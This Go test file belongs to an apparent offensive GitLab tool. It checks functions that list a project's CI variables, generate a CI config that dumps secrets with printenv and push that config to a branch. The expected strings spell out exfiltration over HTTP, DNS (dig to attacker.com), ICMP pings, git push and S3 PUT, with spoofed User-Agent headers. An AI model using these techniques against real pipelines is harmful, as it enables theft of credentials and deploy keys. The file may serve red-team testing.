package attack

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"
)

// --- quoteJoin --------------------------------------------------------------

func TestQuoteJoin(t *testing.T) {
	tests := []struct {
		name string
		in   []string
		want string
	}{
		{"normal slice", []string{"a", "b", "c"}, `"a", "b", "c"`},
		{"trimmed whitespace", []string{" a ", " b "}, `"a", "b"`},
		{"single element", []string{"only"}, `"only"`},
		{"empty slice", []string{}, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := quoteJoin(tt.in)
			if got != tt.want {
				t.Fatalf("quoteJoin(%v) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// --- ListProjectVariableNames -----------------------------------------------

func TestListProjectVariableNames(t *testing.T) {
	mux := http.NewServeMux()

	// GET /api/v4/projects/1/variables
	mux.HandleFunc("/api/v4/projects/1/variables", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode([]map[string]any{
			{"key": "SECRET_TOKEN", "value": "abc123", "variable_type": "env_var"},
			{"key": "DEPLOY_KEY", "value": "xyz789", "variable_type": "env_var"},
		})
	})

	att, ts := newMockAttacker(t, mux)
	defer ts.Close()

	s := NewSecretsAttack(att)
	names, err := s.ListProjectVariableNames(context.Background(), "1")
	if err != nil {
		t.Fatalf("ListProjectVariableNames: %v", err)
	}
	if len(names) != 2 {
		t.Fatalf("expected 2 variable names, got %d", len(names))
	}
	if names[0] != "SECRET_TOKEN" {
		t.Fatalf("expected first variable name=SECRET_TOKEN, got %s", names[0])
	}
	if names[1] != "DEPLOY_KEY" {
		t.Fatalf("expected second variable name=DEPLOY_KEY, got %s", names[1])
	}
}

func TestListProjectVariableNames_Empty(t *testing.T) {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/v4/projects/1/variables", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode([]map[string]any{})
	})

	att, ts := newMockAttacker(t, mux)
	defer ts.Close()

	s := NewSecretsAttack(att)
	names, err := s.ListProjectVariableNames(context.Background(), "1")
	if err != nil {
		t.Fatalf("ListProjectVariableNames: %v", err)
	}
	if len(names) != 0 {
		t.Fatalf("expected 0 variable names, got %d", len(names))
	}
}

// --- GenerateExfilCI --------------------------------------------------------

func TestGenerateExfilCI(t *testing.T) {
	// GenerateExfilCI produces valid YAML with real newlines.
	tests := []struct {
		name         string
		branchName   string
		pubkey       string
		runnerTags   []string
		exfil        ExfilOptions
		wantContains []string
	}{
		{
			name:         "no encryption",
			branchName:   "exfil-branch",
			pubkey:       "",
			runnerTags:   nil,
			wantContains: []string{"stages:", "exfiltrate", "printenv", "secrets.json", "push", "python3", "python -c", "printf '{'"},
		},
		{
			name:         "with tags",
			branchName:   "exfil-branch",
			pubkey:       "",
			runnerTags:   []string{"self-hosted", "linux"},
			wantContains: []string{"tags:", `"self-hosted"`, `"linux"`},
		},
		{
			name:         "with pubkey encryption",
			branchName:   "exfil-branch",
			pubkey:       "ssh-rsa AAAAB3NzaC1yc2EAAAAD test@example.com",
			runnerTags:   nil,
			wantContains: []string{"base64", "openssl", "aes", "pub.pem", "secrets.enc"},
		},
		{
			name:       "http exfil",
			branchName: "exfil-branch",
			exfil:      ExfilOptions{Method: "http", Target: "http://listener:8080/callback"},
			wantContains: []string{
				"base64 -w0 secrets.json",
				"curl -sS -X POST",
				"User-Agent: GitLab-Webhook/1.0",
				"http://listener:8080/callback",
				"pipeline_id",
			},
		},
		{
			name:       "http exfil encrypted",
			branchName: "exfil-branch",
			pubkey:     "ssh-rsa AAAAB3NzaC1yc2EAAAAD test@example.com",
			exfil:      ExfilOptions{Method: "http", Target: "http://listener:8080/callback"},
			wantContains: []string{
				"base64 -w0 secrets.enc",
				"base64 -w0 aes.enc",
				"curl -sS -X POST",
				"http://listener:8080/callback",
			},
		},
		{
			name:       "dns exfil",
			branchName: "exfil-branch",
			exfil:      ExfilOptions{Method: "dns", Target: "attacker.com"},
			wantContains: []string{
				"base64 -w0 secrets.json",
				"tr '+/' '-_'",
				"md5sum",
				"dig +short",
				"attacker.com",
				"sleep 0.1",
			},
		},
		{
			name:       "icmp exfil",
			branchName: "exfil-branch",
			exfil:      ExfilOptions{Method: "icmp", Target: "1.2.3.4"},
			wantContains: []string{
				"xxd -p",
				"ping -c 1 -p",
				"1.2.3.4",
				"sleep 0.05",
			},
		},
		{
			name:       "git exfil",
			branchName: "exfil-branch",
			exfil:      ExfilOptions{Method: "git", Target: "https://token@git.attacker.com/repo.git"},
			wantContains: []string{
				"git clone --depth 1",
				"https://token@git.attacker.com/repo.git",
				"git push -q origin HEAD",
				"exfil-$CI_PIPELINE_ID",
			},
		},
		{
			name:       "cloud exfil",
			branchName: "exfil-branch",
			exfil:      ExfilOptions{Method: "cloud", Target: "https://bucket.s3.amazonaws.com/secrets"},
			wantContains: []string{
				"curl -sS -X PUT",
				"User-Agent: aws-sdk-go/1.44.0",
				"https://bucket.s3.amazonaws.com/secrets",
				"target_file=secrets.json",
			},
		},
		{
			name:       "cloud exfil encrypted",
			branchName: "exfil-branch",
			pubkey:     "ssh-rsa AAAAB3NzaC1yc2EAAAAD test@example.com",
			exfil:      ExfilOptions{Method: "cloud", Target: "https://bucket.s3.amazonaws.com/secrets"},
			wantContains: []string{
				"target_file=secrets.enc",
				"aes-key",
			},
		},
		{
			name:         "default artifact method unchanged",
			branchName:   "exfil-branch",
			exfil:        ExfilOptions{Method: "artifact"},
			wantContains: []string{"stages:", "exfiltrate", "printenv", "secrets.json", "artifacts:"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			att := NewAttacker(nil, "https://gitlab.com", "Test", "t@t.com", 0)
			s := NewSecretsAttack(att)
			yaml := s.GenerateExfilCI(tt.branchName, tt.pubkey, tt.runnerTags, tt.exfil)
			for _, substr := range tt.wantContains {
				if !strings.Contains(yaml, substr) {
					t.Errorf("expected %q in output:\n%s", substr, yaml)
				}
			}
			if yaml == "" {
				t.Fatal("expected non-empty output")
			}
		})
	}
}

// --- RunExfil ---------------------------------------------------------------

func TestRunExfil(t *testing.T) {
	mux := http.NewServeMux()

	// GET /api/v4/user
	mux.HandleFunc("/api/v4/user", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"id":       1,
			"username": "testbot",
			"name":     "Test Bot",
			"email":    "bot@example.com",
		})
	})

	// GET /api/v4/projects/1/repository/branches/exfil-branch — branch exists
	mux.HandleFunc("/api/v4/projects/1/repository/branches/exfil-branch", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"name": "exfil-branch"})
	})

	// PUT /api/v4/projects/1/repository/files/.gitlab-ci.yml
	mux.HandleFunc("/api/v4/projects/1/repository/files/.gitlab-ci.yml", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPut {
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]any{"file_path": ".gitlab-ci.yml"})
			return
		}
		w.WriteHeader(http.StatusMethodNotAllowed)
	})

	// GET /api/v4/projects/1
	mux.HandleFunc("/api/v4/projects/1", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"id":                  1,
			"default_branch":      "main",
			"path_with_namespace": "group/secret-project",
		})
	})

	att, ts := newMockAttacker(t, mux)
	defer ts.Close()

	s := NewSecretsAttack(att)
	url, err := s.RunExfil(context.Background(), "1", "exfil-branch", "", nil, ExfilOptions{})
	if err != nil {
		t.Fatalf("RunExfil: %v", err)
	}
	if !strings.Contains(url, "group/secret-project") {
		t.Fatalf("expected pipeline URL containing project path, got %s", url)
	}
	if !strings.Contains(url, "exfil-branch") {
		t.Fatalf("expected pipeline URL containing branch ref, got %s", url)
	}
}
